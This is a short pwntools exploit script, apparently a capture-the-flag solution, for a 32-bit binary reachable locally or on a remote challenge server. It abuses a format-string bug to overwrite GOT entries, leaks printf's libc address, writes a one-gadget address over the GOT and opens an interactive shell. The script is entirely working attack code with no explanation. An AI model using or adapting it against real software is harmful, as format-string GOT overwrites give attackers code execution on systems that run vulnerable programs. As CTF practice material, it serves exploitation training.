from pwn import *
#context.log_level = 'debug'



local=0

if local:
	cn = process('./Laaa')
	libc = ELF('/lib/i386-linux-gnu/libc.so.6')
	
	p = fmtstr_payload(12,{0x0804A014:0x08048517,0x0804A030:0x2223322})
	print len(p)
	cn.sendline(p)
	cn.recv()
	
	p = '%14$saaa'+p32(0x0804A00C)
	cn.sendline(p)
	printf = u32(cn.recv()[:4])
	success('printf: '+hex(printf))
	one = printf-libc.symbols['printf']+0x5fbc5
	
	p = fmtstr_payload(12,{0x0804A00C:one,0x0804A030:0})
	cn.sendline(p)
	
	cn.interactive()
else:
	cn = remote('challenges.xctf.org.cn', 14004)
	libc = ELF('./libc.so.6')
	print hex(libc.symbols['printf'])
	p = fmtstr_payload(12,{0x0804A014:0x08048517,0x0804A030:0x2223322})
	p = p.ljust(0x1000,'a')
	print len(p)
	cn.sendline(p)
	#cn.recv()
	
	p = '%14$saaa'+p32(0x0804A00C)
	p = p.ljust(0x1000,'a')
	cn.sendline(p)
	cn.recvuntil('\x0a')
	printf = u32(cn.recv()[:4])
	success('printf: '+hex(printf))
	one = printf-libc.symbols['printf']+0x5f065
	
	p = fmtstr_payload(12,{0x0804A00C:one,0x0804A030:0})
	cn.sendline(p)
	
	cn.interactive()